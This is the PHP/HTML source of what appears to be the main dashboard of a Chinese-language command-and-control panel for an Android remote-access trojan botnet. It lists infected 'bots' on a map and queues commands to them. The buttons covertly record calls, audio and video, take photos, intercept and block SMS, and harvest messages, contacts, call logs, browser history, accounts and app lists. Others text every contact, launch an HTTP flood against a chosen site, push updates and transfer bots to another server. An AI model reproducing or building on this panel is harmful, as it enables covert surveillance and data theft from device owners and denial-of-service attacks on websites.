<?php
  if (file_exists("reg.php")) {
    include("reg.php");
	if ($validDomain == "false") {
	  die("域名未授权，请联系管理员");
	}
  } else {
    die("文件丢失");
  }

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    header('Location: setup/');
  }
  
  session_start();
  if (empty($_SESSION['code'])) {
    header( 'Location: index.php' ) ;
    die();
  }
  
  include("functions.php");
  
  $getslaves = 'SELECT * FROM bots ORDER BY id';
  
?>
<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
    <title>Control</title>

    <link href="assets/css/bootstrap.css" rel="stylesheet" media="screen">
	<link href="assets/css/bootstrap-glyphicons.css" rel="stylesheet" media="screen">
	
	<script src="http://code.jquery.com/jquery.js"></script>
	<script src="assets/js/jquery.tablesorter.min.js"></script>
	<script src="assets/js/jquery.tablesorter.widgets.min.js"></script>
	<script src="assets/js/date.js"></script>
	
    <style type="text/css">
	  body {
	    background-image:url('assets/img/login_bg.png');
	  }
	  .main {
        width: 98%;
        height: 98%;
		
		background-color: #ffffff;
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
        outline: none;
        -webkit-box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
        box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);

        position: absolute;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;

        margin: auto;
		
		padding: 15px 15px 15px 15px;
      }
	  .logo {
		margin: 0 0 0 -140px;
		height: 532px;
		width: 200px;
		z-index:-1;
		position: absolute;
	  }
	  #func td {
	    padding: 2px 2px 2px 2px;
		text-align: center;
	  }
	  .map {
	    width: 100%;
		height: 82%;
		margin-bottom: 5px;
	  }
	  #files td {
	    padding: 2px 2px 2px 2px;
		text-align: center;
	  }
	  .row {
	    margin: 0 0 -5px 0;
	  }
	  .fullwidth {
	    width: 100%;
		min-width: 135px;
	  }
	  .halfwidth {
	    width: 48%;
	  }
	  .addselection {
	    min-width: 30px;
	  }
	  .devicestable {
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
		margin-bottom: 5px;
	  }
	  .functionslist {
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
		margin-bottom: 5px;
	  }
	  .messageboxcontainer {
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
		min-height: 185px;
		max-height: 39%;
		/* position: absolute; */
	  }
	  .filestable {
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
		min-height: 185px;
		max-height: 185px;
		padding-top: 5px;
	  }
	  .mapcontainer {
        border: 1px solid #999999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
		min-height: 185px;
		max-height: 39%;
		padding: 5px 5px 5px 5px;
		/* position: absolute; */
	  }
      input {
        text-align: center;
      }
	</style>
    <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=false"></script>
    <script>
var map;
function initialize() {
  var mapOptions = {
    zoom: 0,
    center: new google.maps.LatLng(0.0, 0.0),
	disableDefaultUI: true,
    panControl: false,
    zoomControl: true,
    scaleControl: false,
    mapTypeId: google.maps.MapTypeId.HYBRID
  };
  map = new google.maps.Map(document.getElementById('map-canvas'),
      mapOptions);
}

google.maps.event.addDomListener(window, 'load', initialize);

    </script>
	
	<script>
	var selected=new Array();
	
	var markersArray = [];
	
	function gmapsmarker(location1, location2, title) {
	  var marker = new google.maps.Marker({
        position: new google.maps.LatLng(location1, location2),
        map: map,
		animation: google.maps.Animation.DROP,
        title: title
      });
	  markersArray.push(marker);
	}
	
	function deleteOverlays() {
      if (markersArray) {
        for (i in markersArray) {
          markersArray[i].setMap(null);
        }
        markersArray.length = 0;
      }
    }
	
	function deleteMarker(deltitle) {
	  return markersArray.indexOf(deltitle);
	}
	
	function select(bot, lat, longi) {
	  if (document.getElementById(bot).innerHTML == '-') {
	    document.getElementById(bot).innerHTML = '+';
		for(var i in selected){
          if(selected[i]==bot){
            selected.splice(i,1);
            break;
          }
        }
	    document.getElementById("selectednumber").innerHTML = selected.length;
		if (selected.length==0) {
		  document.getElementById("selectednumber").setAttribute("data-original-title", "None Selected");
		  deleteOverlays();
		} else {
	      document.getElementById("selectednumber").setAttribute("data-original-title", selected.join(', '));
		}
	  } else {
	  if (selected.indexOf(bot) == -1) {
	    selected.push(bot);
	  }
	  document.getElementById(bot).innerHTML = '-';
	  document.getElementById("selectednumber").innerHTML = selected.length;
	  document.getElementById("selectednumber").setAttribute("data-original-title", selected.join(', '));
	  gmapsmarker(lat, longi, bot);
	  }
	}
	
	function clearselection() {
	  for (var i=0;i<selected.length;i++) {
	    document.getElementById(selected[i]).innerHTML = '+';
	  }
	  selected.length = 0;
	  document.getElementById("selectednumber").innerHTML = selected.length;
	  document.getElementById("selectednumber").setAttribute("data-original-title", "None Selected");
	  deleteOverlays();
	}
	
	function selectall() {
	  selected = $("div.addbuttons > button").map(function(){
        return this.id;
      }).get();
	  var index = selected.indexOf(" ");
	  selected.splice(index, 1);
	  var index2 = selected.indexOf("");
	  selected.splice(index2, 1);
	  for (var i=0;i<selected.length;i++) {
		document.getElementById(selected[i]).onclick();
	  }
	  document.getElementById("selectednumber").innerHTML = selected.length;
	  document.getElementById("selectednumber").setAttribute("data-original-title", selected.join(', '));
	}
	
	function getHistory(uid) {
	  if (uid=="") {
	    document.getElementById("historyof").innerHTML = "全部主机";
	  } else {
	    document.getElementById("historyof").innerHTML = uid;
	  }
	  var xmlhttp;
	  xmlhttp=new XMLHttpRequest();
	  xmlhttp.onreadystatechange=function() {
	    if (xmlhttp.readyState==4 && xmlhttp.status==200){
		  document.getElementById("messages").innerHTML=xmlhttp.responseText;
		}
	  }
	  xmlhttp.open("GET","getmessages.php?uid="+uid,true);
      xmlhttp.send();
	}
	
	function addCommand(command, arg1, arg2) {
	  var xmlhttp;
	  xmlhttp=new XMLHttpRequest();
	  xmlhttp.onreadystatechange=function() {
	    if (xmlhttp.readyState==4 && xmlhttp.status==200){
		  if (xmlhttp.responseText=="Success"){
		    alert("Command Added");
		  } else {
		    alert(xmlhttp.responseText);
		  }
		}
	  }
	  xmlhttp.open("GET","addcommand.php?uid="+selected+"&command="+command+"&arg1="+arg1+"&arg2="+arg2,true);
      xmlhttp.send();
	}
	
	var refresh;
	
	var scroll;
	
	<?php if($autoscrolltextbox){ echo "scroll='auto'"; } else { echo "scroll='manual'"; } ?>
	
	function updateScroll() {
	  if (scroll=='auto'){
	    scroll='manual';
		document.getElementById("autoscrollbutton").innerHTML="Auto Scroll: Off";
	  } else {
	    scroll='auto';
		document.getElementById("autoscrollbutton").innerHTML="Auto Scroll: On";
	  }
	}
	
	function autoScroll(){
	  if (scroll=='auto'){
        var elem = document.getElementById('messagebox');
        elem.scrollTop = elem.scrollHeight;
	  } else {
	  
	  }
	}
	
	function autorefresh(uid) {
	  refresh = setInterval(function() { getHistory(uid); autoScroll(); }, <?php echo $messageboxrefreshspeed; ?>);
	}
	
	function stoprefresh() {
	  window.clearInterval(window.refresh);
	}
	
	function viewCommands() {
	  stoprefresh();
	  var xmlhttp;
	  xmlhttp=new XMLHttpRequest();
	  xmlhttp.onreadystatechange=function() {
	    if (xmlhttp.readyState==4 && xmlhttp.status==200){
		  document.getElementById("messages").innerHTML=xmlhttp.responseText;
		}
	  }
	  xmlhttp.open("GET","getwaitingcommands.php",true);
      xmlhttp.send();
	}
	
	function fixSelected() {
			$.each(selected, function(index, value) {
				document.getElementById(value).innerHTML = '-';
            });
	}

    function refreshTable() {
        $('#tablefill').load('table.php', function(){
		  fixSelected();
		});
    }
	
	function refreshFileTable() {
        $('#filetablefill').load('filetable.php', function(){
		});
	}
	
	function refreshImages() {
	    $('#replaceimages').load('showpictures.php?uid='+uid, function(){
		  var sliderval=document.getElementById('defaultSlider').value;
		  $('.getimgimg').width(sliderval+'px');
		});
	}
	
	function getImages() {
	  uid = $("#modaluid").val();
	  startdate = $("#modalstarttime").val();
	  enddate = $("#modalendtime").val();
	  filesize = $("#modalfilesize").val();
	  
	  fixstartdate = Date.parse(startdate).getTime()/1000;
	  fixenddate = Date.parse(enddate).getTime()/1000;
	  
	  var xmlhttp;
	  xmlhttp=new XMLHttpRequest();
	  xmlhttp.onreadystatechange=function() {
	    if (xmlhttp.readyState==4 && xmlhttp.status==200){
		}
	  }
	  xmlhttp.open("GET","getimages.php?uid="+uid+"&start="+fixstartdate+"&end="+fixenddate+"&filesize="+filesize,true);
      xmlhttp.send();
	  refreshImages();
	  imgrefresh = setInterval(refreshImages, 2000);
	}

	function deletePics(uid) {
	  var xmlhttp;
	  xmlhttp=new XMLHttpRequest();
	  xmlhttp.onreadystatechange=function() {
	    if (xmlhttp.readyState==4 && xmlhttp.status==200){
		  alert(xmlhttp.responseText);
		}
	  }
	  xmlhttp.open("GET","deletepics.php?uid="+uid,true);
      xmlhttp.send();
	}
	
$(function(){

    $('#defaultSlider').change(function(){
        $('.getimgimg').width(this.value);
    });

    $('#defaultSlider').change();

});
	</script>
	
	<script type='text/javascript'>
     $(document).ready(function () {
         if ($("[rel=tooltip]").length) {
             $("[rel=tooltip]").tooltip();
         }
         refreshTable();
	     refreshFileTable();
	     getHistory("");
	     autorefresh("");
		 setInterval(refreshTable, <?php echo $devicestablerefreshspeed; ?>);
		 setInterval(refreshFileTable, <?php echo $filestablerefreshspeed; ?>);
     });
    </script>
  </head>
  <body style="width: 100%; height: 100%;">
    <div class="main">
	  <div class="row" style="height:60%;">
	    <div class="col-lg-9 devicestable" style="height:100%; min-height:380px; padding-top: 5px; overflow:auto;">
		   <div id="tablefill"></div>
		</div>
  <div class="modal fade" id="imageModal">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
          <h4 class="modal-title">查看图片</h4>
        </div>
        <div class="modal-body">
		  <p>UID</p>
		  <input class="form-control input-small" id="modaluid" type="text" value="">
		  <p>开始日期</p>
          <input class="form-control input-small" id="modalstarttime" type="date" placeholder="Start Date">
		  <p>结束日期</p>
		  <input class="form-control input-small" id="modalendtime" type="date" placeholder="End Date">
		  <p>最大文件</p>
		  <input class="form-control input-small" id="modalfilesize" type="text" placeholder="Max File Size in MB">
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
          <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#displayImages" data-dismiss="modal" onclick="getImages();">查看图片</button>
        </div>
      </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
  </div><!-- /.modal -->
  
  <div class="modal fade" id="displayImages">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
          <h4 style="display:inline;" class="modal-title">图片</h4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input id="defaultSlider" type="range" min="100" max="520" />
        </div>
        <div class="modal-body">
		  <div id="replaceimages"></div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" onclick="window.clearInterval(window.imgrefresh);" data-dismiss="modal">关闭</button>
        </div>
      </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
  </div><!-- /.modal -->
	    <div class="col-lg-3 functionslist" style="height:100%; min-height:380px; padding-top: 5px; overflow:auto;">
		  <h4 style="display: inline-block;">已选择: <a data-toggle="tooltip" rel="tooltip" title="None Selected" data-placement="bottom" id="selectednumber">0</a></h4>&nbsp;&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="clearselection()">反选全部</button>&nbsp;&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="selectall()">选择全部</button>
		  <table class="table" id="func">
		    <tr>
			  <td><button type="button" onclick="addCommand('ringervolumeup')" class="btn btn-default btn-small fullwidth">铃声音量 加</button></td>
			  <td><button type="button" onclick="addCommand('ringervolumedown')" class="btn btn-default btn-small fullwidth">铃声音量 减</button></td>
			</tr>
		    <tr>
			  <td><button type="button" onclick="addCommand('mediavolumeup')" class="btn btn-default btn-small fullwidth">媒体音量 加</button></td>
			  <td><button type="button" onclick="addCommand('mediavolumedown')" class="btn btn-default btn-small fullwidth">媒体音量 减</button></td>
			</tr>
		    <tr>
			  <td colspan="2"><button type="button" onclick="addCommand('screenon')" class="btn btn-default btn-small fullwidth">屏幕 开</button></td>
			</tr>
		    <tr>
			  <td><button type="button" onclick="addCommand('intercept', true)" class="btn btn-default btn-small fullwidth">拦截 开</button></td>
			  <td><button type="button" onclick="addCommand('intercept', false)" class="btn btn-default btn-small fullwidth">拦截 关</button></td>
			</tr>
		    <tr>
			  <td><button type="button" onclick="addCommand('blocksms', true)" class="btn btn-default btn-small fullwidth">短信拦截 开</button></td>
			  <td><button type="button" onclick="addCommand('blocksms', false)" class="btn btn-default btn-small fullwidth">短信拦截 关</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="audiorecordtime" type="text" placeholder="时间（毫秒）"></td>
			  <td><button type="button" onclick="addCommand('recordaudio', document.getElementById('audiorecordtime').value)" class="btn btn-default btn-small fullwidth">录音</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="videorecordtime" type="text" placeholder="时间（毫秒）"></td>
			  <td><div class="btn-group"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">录像<span class="caret"></span></button><ul class="dropdown-menu" style="left: -17%;"><li><a href="#" onclick="addCommand('takevideo', 1, document.getElementById('videorecordtime').value)">前置摄像头</a></li><li><a href="#" onclick="addCommand('takevideo', 0, document.getElementById('videorecordtime').value)">后置摄像头</a></li></ul></div></td>
			</tr>
		    <tr>
			  <td><button type="button" onclick="alert('Please select Front or Back Camera.')" class="btn btn-default btn-small fullwidth">拍照</button></td>
			  <td><button type="button" onclick="addCommand('takephoto', 1)" class="btn btn-default btn-small halfwidth">前置</button>&nbsp;<button type="button" onclick="addCommand('takephoto', 0)" class="btn btn-default btn-small halfwidth">后置</button></td>
			</tr>
		    <tr>
			  <td><button type="button" onclick="addCommand('recordcalls', true)" class="btn btn-default btn-small fullwidth">通话录音 开</button></td>
			  <td><button type="button" onclick="addCommand('recordcalls', false)" class="btn btn-default btn-small fullwidth">通话录音 关</button></td>
			</tr>
		    <tr>
			  <td colspan="2"><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">上传文件 <span class="caret"></span></button><ul class="dropdown-menu" style="left: 0;"><li><a href="#" onclick="addCommand('uploadfiles')">全部</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Calls')">通话录音</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Audio')">录音</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Pictures')">照片</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Videos')">录像</a></li></div></td>
			</tr>
		    <tr>
			  <td colspan="2"><button type="button" onclick="addCommand('changedirectory')" class="btn btn-default btn-small fullwidth">更改目录</button></td>
			</tr>
		    <tr>
			  <td colspan="2"><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">删除文件 <span class="caret"></span></button><ul class="dropdown-menu" style="left: 0;"><li><a href="#" onclick="addCommand('deletefiles')">全部</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Calls')">通话录音</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Audio')">录音</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Pictures')">照片</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Videos')">录像</a></li></div></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="getamount" type="text" placeholder="数量"></td>
			  <td><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">获取 <span class="caret"></span></button><ul class="dropdown-menu" style="left: -50%;"><li><a href="#" onclick="addCommand('getinboxsms', document.getElementById('getamount').value)">收信箱</a></li><li><a href="#" onclick="addCommand('getsentsms', document.getElementById('getamount').value)">发信箱</a></li><li><a href="#" onclick="addCommand('getbrowserhistory', document.getElementById('getamount').value)">浏览器历史</a></li><li><a href="#" onclick="addCommand('getbrowserbookmarks', document.getElementById('getamount').value)">浏览器书签</a></li><li><a href="#" onclick="addCommand('getcallhistory', document.getElementById('getamount').value)">通话记录</a></li><li><a href="#" onclick="addCommand('getcontacts', document.getElementById('getamount').value)">联系人</a></li><li><a href="#" onclick="addCommand('getuseraccounts', document.getElementById('getamount').value)">用户帐户</a></li><li><a href="#" onclick="addCommand('getinstalledapps', document.getElementById('getamount').value)">安装的APP</a></li></div></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="smsnumber" type="text" placeholder="号码"><input class="form-control input-small" id="smsmessage" type="text" placeholder="短信内容"></td>
			  <td><button type="button" onclick="addCommand('sendtext', document.getElementById('smsnumber').value, document.getElementById('smsmessage').value)" class="btn btn-default btn-small fullwidth">发送短信</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="deletesmsthreadid" type="text" placeholder="线程ID"><input class="form-control input-small" id="deletesmsid" type="text" placeholder="ID"></td>
			  <td><button type="button" onclick="addCommand('deletesms', document.getElementById('deletesmsthreadid').value, document.getElementById('deletesmsid').value)" class="btn btn-default btn-small fullwidth">删除短信</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="contactsmessage" type="text" placeholder="短信内容"></td>
			  <td><button type="button" onclick="addCommand('sendcontacts', document.getElementById('contactsmessage').value)" class="btn btn-default btn-small fullwidth">发给联系人</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="callnumber" type="text" placeholder="号码"></td>
			  <td><button type="button" onclick="addCommand('callnumber', document.getElementById('callnumber').value)" class="btn btn-default btn-small fullwidth">拨打号码</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="calllognumber" type="text" placeholder="号码"></td>
			  <td><button type="button" onclick="addCommand('deletecalllognumber', document.getElementById('calllognumber').value)" class="btn btn-default btn-small fullwidth">删除通话记录</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="webpagesite" type="text" placeholder="网址"></td>
			  <td><button type="button" onclick="addCommand('openwebpage', document.getElementById('webpagesite').value)" class="btn btn-default btn-small fullwidth">打开网页</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="dialogtitle" type="text" placeholder="标题"><input class="form-control input-small" id="dialogmessage" type="text" placeholder="内容"></td>
			  <td><button type="button" onclick="addCommand('opendialog', document.getElementById('dialogtitle').value, document.getElementById('dialogmessage').value)" class="btn btn-default btn-small fullwidth">打开对话框</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="appname" type="text" placeholder="App"></td>
			  <td><button type="button" onclick="addCommand('openapp', document.getElementById('appname').value)" class="btn btn-default btn-small fullwidth">打开App</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="floodsite" type="text" placeholder="网站"><input class="form-control input-small" id="floodtime" type="text" placeholder="时间（毫秒）"></td>
			  <td><button type="button" onclick="addCommand('httpflood', document.getElementById('floodsite').value, document.getElementById('floodtime').value)" class="btn btn-default btn-small fullwidth">HTTP攻击</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="updateapplink" type="text" placeholder="链接"><input class="form-control input-small" id="updateappversion" type="text" placeholder="版本 #"></td>
			  <td><button type="button" onclick="addCommand('updateapp', document.getElementById('updateapplink').value, document.getElementById('updateappversion').value)" class="btn btn-default btn-small fullwidth">更新App</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="promptupdateversion" type="text" placeholder="版本 #"></td>
			  <td><button type="button" onclick="addCommand('promptupdate', document.getElementById('promptupdateversion').value)" class="btn btn-default btn-small fullwidth">立即更新</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="transferboturl" type="text" placeholder="服务器地址"></td>
			  <td><button type="button" onclick="addCommand('transferbot', document.getElementById('transferboturl').value)" class="btn btn-default btn-small fullwidth">主机转移</button></td>
			</tr>
		    <tr>
			  <td><input class="form-control input-small" id="timeouttime" type="text" placeholder="时间（毫秒）"></td>
			  <td><button type="button" onclick="addCommand('settimeout', document.getElementById('timeouttime').value)" class="btn btn-default btn-small fullwidth">设置超时</button></td>
			</tr>
		    <tr>
			  <td colspan="2"><button type="button" onclick="addCommand('promptuninstall')" class="btn btn-default btn-small fullwidth">立即卸载</button></td>
			</tr>
            <tr><td></td><td></td><td></td></tr>
		  </table>
		</div>
	  </div>
	  <div class="row" style="height:37%; ">
		    <div class="col-lg-5 messageboxcontainer" style="height:100%; min-height: 100%;">
			  <h4 style="display: inline-block;">历史记录: <a id="historyof">全部主机</a></h4>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="stoprefresh(); getHistory(''); autorefresh('');">全部主机</button>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" id="autoscrollbutton" onclick="updateScroll();">自动滚动: <?php if($autoscrolltextbox){echo "开";} else {echo "关";} ?></button>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="viewCommands();">查看待执行命令</button>
			  <div class="well well-small" id="messagebox" style="max-height: 75%; min-height: 75%; overflow: auto;">
			    <div id="messages" style="font-size: <?php echo $postboxtextsize . 'px;'; ?>"></div>
			  </div>
			</div>
			<div class="col-lg-4 filestable" style="height:100%; min-height: 100%; overflow: auto;">
			  <div id="filetablefill"></div>
			</div>
	    <div class="col-lg-3 mapcontainer" style="height:100%; min-height: 100%;">
		  <div class="map" id="map-canvas"></div>
		  <button type="button" onClick="window.location='settings.php'" style="width: 48%" class="btn btn-default btn-small">后台设置</button>&nbsp;&nbsp;&nbsp;<button type="button" onClick="window.location='logout.php'" style="width: 48%" class="btn btn-default btn-small">退出</button>
		</div>
	  </div>
	</div>
	
	<script src="assets/js/bootstrap.min.js"></script>
	<script>
	$(document).ready(function() 
        { 
			$("#files").tablesorter();
        } 
    );
    </script>

  </body>
</html>
<?php
  $connect = null;
?>